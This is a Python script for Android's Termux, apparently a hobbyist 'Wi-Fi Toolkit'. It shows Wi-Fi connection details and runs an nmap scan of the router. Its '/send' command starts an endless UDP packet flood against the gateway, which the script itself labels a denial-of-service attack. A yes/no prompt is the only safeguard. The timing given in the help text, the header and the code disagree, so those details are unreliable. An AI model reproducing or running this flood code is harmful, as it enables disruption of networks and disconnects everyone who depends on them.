import subprocess
import json
import re
import socket
import random
import time
import os
import sys

# --- Utility and Color Functions ---

def run_command(command):
    """Executes a system command and returns its output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True, encoding='utf-8')
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"Error: {e.stderr.strip()}"
    except FileNotFoundError:
        return f"Error: Command '{command.split()[0]}' not found."

def get_gateway_ip():
    """
    Finds the gateway (router) IP in Termux using multiple methods for reliability.
    """
    # Method 1: Try getprop (more direct and reliable on Android)
    output = run_command("getprop dhcp.wlan0.gateway")
    if output and re.match(r"\d+\.\d+\.\d+\.\d+", output):
        return output.strip()

    # Method 2: Fallback to parsing 'ip route' (standard Linux method)
    output = run_command("ip route")
    match = re.search(r'default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
    if match:
        return match.group(1)

    return None # Return None if both methods fail

def print_header(title):
    """Prints a colored header."""
    print(f"\n\033[1;34m--- {title.upper()} ---\033[0m")

def print_label_value(label, value, color="\033[1;32m"):
    """Prints a label-value pair."""
    print(f"{label:<25}: {color}{value}\033[0m")

# --- Main Toolkit Functions ---

def show_wifi_info():
    """Shows a complete and detailed analysis of the Wi-Fi connection."""
    print_header("Wi-Fi Connection Analysis")

    # 1. Basic Info from Termux API
    print("\033[1;36m[+] Basic Information from Android API\033[0m")
    wifi_info_json = run_command("termux-wifi-connectioninfo")
    if "Error" not in wifi_info_json and wifi_info_json:
        try:
            data = json.loads(wifi_info_json)
            rssi = data.get("rssi", "N/A")
            # Approximate RSSI to Quality (%) conversion
            if isinstance(rssi, int):
                if rssi > -50:
                    quality = "Excellent"
                elif rssi > -70:
                    quality = "Good"
                elif rssi > -80:
                    quality = "Fair"
                else:
                    quality = "Poor"
                quality_str = f"{quality} ({rssi} dBm)"
            else:
                quality_str = "N/A"

            print_label_value("SSID", data.get("ssid", "N/A"))
            print_label_value("BSSID (AP MAC)", data.get("bssid", "N/A"))
            print_label_value("Signal Quality", quality_str)
            print_label_value("Link Speed", f"{data.get('link_speed_mbps', 'N/A')} Mbps")
            print_label_value("Frequency", f"{data.get('frequency_mhz', 'N/A')} MHz")
            print_label_value("Local IP", data.get("ip", "N/A"))
            print_label_value("Public IP", run_command("curl -s ifconfig.me"))
            print_label_value("Supplicant State", data.get("supplicant_state", "N/A"))
        except json.JSONDecodeError:
            print_label_value("Error", "Could not parse termux-api output.")
    else:
        print("Could not get Wi-Fi info. Ensure termux-api is installed and working.")

    # 2. Network Details (Gateway, DNS)
    print("\n\033[1;36m[+] Network Details\033[0m")
    gateway_ip = get_gateway_ip()
    if gateway_ip:
        print_label_value("Gateway (Router)", gateway_ip)
        # Ping the gateway for local latency
        ping_output = run_command(f"ping -c 3 {gateway_ip}")
        latency_match = re.search(r'min/avg/max/mdev = [\d.]+/([\d.]+)/', ping_output)
        latency = f"{latency_match.group(1)} ms" if latency_match else "N/A"
        print_label_value("Latency (to Gateway)", latency)
    else:
        print_label_value("Gateway (Router)", "Not found")

    dns1 = run_command("getprop net.dns1")
    dns2 = run_command("getprop net.dns2")
    print_label_value("DNS Server 1", dns1)
    print_label_value("DNS Server 2", dns2)

    # 3. Advanced Gateway Scan with Nmap
    if gateway_ip:
        print("\n\033[1;36m[+] Advanced Gateway Scan (may take a moment)\033[0m")
        print(f"Running 'nmap -F {gateway_ip}'...")
        nmap_output = run_command(f"nmap -F {gateway_ip}")
        print("\033[0;33m" + nmap_output + "\033[0m")


def start_packet_flood(amount_str):
    """
    Sends a burst of UDP packets to the gateway to test network stability.
    """
    print_header("Wi-Fi Stress Test (DoS Attack)")
    print("\033[1;31m*** WARNING: YOU ARE ABOUT TO INITIATE A DENIAL OF SERVICE ATTACK ***\033[0m")
    print("\033[1;33mUse this only on your own network. It may disconnect all connected devices.\033[0m")
    
    confirm = input("Are you sure you want to proceed? (y/n): ")
    if confirm.lower() != 'y':
        print("Operation cancelled.")
        return

    try:
        amount = int(amount_str)
    except ValueError:
        print("\033[1;31mError: Amount must be an integer.\033[0m")
        return

    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print("\033[1;31mError: Could not find gateway IP. Aborting.\033[0m")
        return

    print(f"\nTarget: Gateway ({gateway_ip})")
    print(f"Mode: {amount} UDP packets every 3 seconds.")
    print("\033[1;36mPress Ctrl+C to stop the attack cycle.\033[0m")
    time.sleep(2)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 1024 bytes of random data
        payload = random.randbytes(1024) 
        
        cycle = 1
        while True:
            print(f"\n--- Cycle #{cycle} ---")
            print(f"Sending {amount} packets to {gateway_ip}...")
            
            for i in range(amount):
                # Choose a random port for each packet to vary the attack
                port = random.randint(1025, 65535)
                s.sendto(payload, (gateway_ip, port))
                # Print progress without a newline
                print(f"\rPackets sent: {i+1}/{amount}", end="")
            
            print("\n\033[1;32mBurst complete.\033[0m Waiting for 2 seconds...")
            time.sleep(2)
            cycle += 1

    except KeyboardInterrupt:
        print("\n\n\033[1;31mAttack stopped by user.\033[0m")
    except Exception as e:
        print(f"\n\n\033[1;31mAn error occurred: {e}\033[0m")
    finally:
        s.close()


def show_help():
    """Shows available commands."""
    print_header("Available Commands")
    print("  \033[1;32minfo\033[0m          - Show a detailed analysis of the Wi-Fi connection.")
    print("  \033[1;32m/send <num>\033[0m   - Send <num> packets to the router every 50s (Stress Test).")
    print("  \033[1;32mhelp\033[0m          - Show this help message.")
    print("  \033[1;32mclear\033[0m         - Clear the screen.")
    print("  \033[1;32mexit\033[0m          - Exit the toolkit.")

def main():
    """Main loop for the toolkit."""
    # Check dependencies
    if "not found" in run_command("termux-wifi-connectioninfo --version"):
        print("\033[1;31mError: 'termux-api' does not seem to be installed or working.\033[0m")
        print("Run 'pkg install termux-api' and install the Termux:API app.")
        sys.exit(1)

    os.system("clear")
    print("\033[1;34m=====================================\033[0m")
    print("\033[1;36m    Python Wi-Fi Toolkit for Termux by huawetto\033[0m")
    print("\033[1;34m=====================================\033[0m")
    print("Type 'help' for a list of commands.")

    while True:
        try:
            raw_input = input("\n\033[1;35mtoolkit> \033[0m").strip()
            if not raw_input:
                continue

            parts = raw_input.split()
            command = parts[0].lower()

            if command == "info":
                show_wifi_info()
            elif command == "/send":
                if len(parts) > 1:
                    start_packet_flood(parts[1])
                else:
                    print("\033[1;31mUsage: /send <number_of_packets>\033[0m")
            elif command == "help":
                show_help()
            elif command == "clear":
                os.system("clear")
            elif command == "exit":
                print("Exiting...")
                break
            else:
                print(f"\033[1;31mCommand '{command}' not recognized. Type 'help'.\033[0m")

        except KeyboardInterrupt:
            print("\nExiting... (Ctrl+C detected)")
            break
        except Exception as e:
            print(f"\n\033[1;31mAn unexpected error occurred: {e}\033[0m")


if __name__ == "__main__":
    main()
